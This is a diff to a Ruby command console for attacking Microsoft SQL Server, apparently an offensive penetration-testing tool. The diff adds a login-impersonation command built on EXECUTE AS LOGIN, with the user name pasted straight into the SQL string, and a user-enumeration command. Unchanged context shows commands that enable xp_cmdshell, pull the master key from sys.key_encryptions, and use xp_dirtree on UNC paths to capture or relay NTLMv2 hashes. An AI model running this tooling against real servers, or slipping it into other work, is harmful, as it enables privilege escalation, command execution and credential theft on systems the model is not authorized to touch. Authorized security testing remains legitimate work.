@@ -372,6 +372,11 @@ on      perm.grantee_principal_id = princ.principal_id
     master_key = cmd_query("SELECT substring(crypt_property, 9, len(crypt_property) - 8) FROM sys.key_encryptions WHERE key_id=102 AND (thumbprint=0x03 or thumbprint=0x0300000001)")
   end
 
+  # 
+  # 
+  # System Commands
+  # 
+  # 
   def cmd_enable_xpcmdshell(val=nil)
     puts "[+] ".green + "Current configurations:"
     cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
@@ -388,6 +393,17 @@ on      perm.grantee_principal_id = princ.principal_id
     cmd_query("EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')")
     puts "[+] ".green + "Modified configurations:"
     cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+  end
+
+  def cmd_impersonate_login(user)
+    puts "[+] ".green + "Current user:"
+    u = cmd_query("SELECT SYSTEM_USER AS 'username'", print: false).first[:username]
+    puts u
+    puts "[+] ".green + "Trying to impersonate '#{user}' user..."
+    cmd_query("EXECUTE AS LOGIN = '#{user}';", print: false)
+    puts "[+] ".green + "Current user (impersonated):"
+    u = cmd_query("SELECT SYSTEM_USER AS 'username'", print: false).first[:username]
+    puts u
   end
 
   # 
@@ -437,6 +453,11 @@ on      perm.grantee_principal_id = princ.principal_id
       "mkdir" => "mkdir <DIR> - Create directories and subdirectories (acts like mkdir -p). (full path must given)",
       "dirtree" => "dirtree <UNC> - Execute xp_dirtree to list local or remote(UNC) system's files & directories. UNC path can be used to capture NTLMv2 hash or NTLM-relay.",
       "download" => "download <FILE> - Download files from MSSQL server system. (full path must given)",
+    }
+    
+    db = {
+      "impersonate-login" => "",
+      "impersonate-user" => "",
       "enable-xpcmdshell" => "enable-xpcmdshell - enable xp_cmdshell on MSSQL.",
       "disable-xpcmdshell" => "disable-xpcmdshell - disable xp_cmdshell on MSSQL."
     }
@@ -447,6 +468,7 @@ on      perm.grantee_principal_id = princ.principal_id
       "db-admins" => "db-admins - retrieve sysadmins.",
       "logons" => "logons - retrieve logged-on users.",
       "sessions" => "sessions - retrieve sessions (includes usernames and hostnames).",
+      "enum-users" => "enum-users [NUM=10] - retrieve database users by id (default: first 0-10).",
       "enum-domain-groups" => "enum-domain-groups [DOMAIN]- retrieve domain groups.",
       "enum-impersonation" => "enum-impersonation - enumerate impersonationable users.",
       "dbs" => "dbs - list databases.",
@@ -455,7 +477,7 @@ on      perm.grantee_principal_id = princ.principal_id
       "links" => "links - crawl MSSQL links.",
     }
 
-    commands = {main: main, system: system, enum: enum}
+    commands = {main: main, system: system, db: db, enum: enum}
   end
 
   def cmd_help(val=nil)
@@ -472,6 +494,10 @@ on      perm.grantee_principal_id = princ.principal_id
     end
     puts "--[ " + "System".cyan + " ]-------------------"
     gen_help[:system].each do |cmd, desc|
+      puts cmd.ljust(20," ") + desc
+    end
+    puts "--[ " + "DB & SQL Service".cyan + " ]---------"
+    gen_help[:db].each do |cmd, desc|
       puts cmd.ljust(20," ") + desc
     end
     puts "--[ " + "Enumuration".cyan + " ]-------------"
@@ -635,7 +661,6 @@ begin
   puts "[+] ".green + "Connected to '#{db_conn[:host]}:#{db_conn[:port]}'."
   puts "[¡] ".dark_cyan + "run 'help' to list avilable commands."
 
-
   set_default_console
 
   # trap('INT', 'DEFAULT')
@@ -652,4 +677,3 @@ rescue Interrupt
 rescue Exception => e 
   puts "[x] ".red + e.full_message.to_s
 end
-
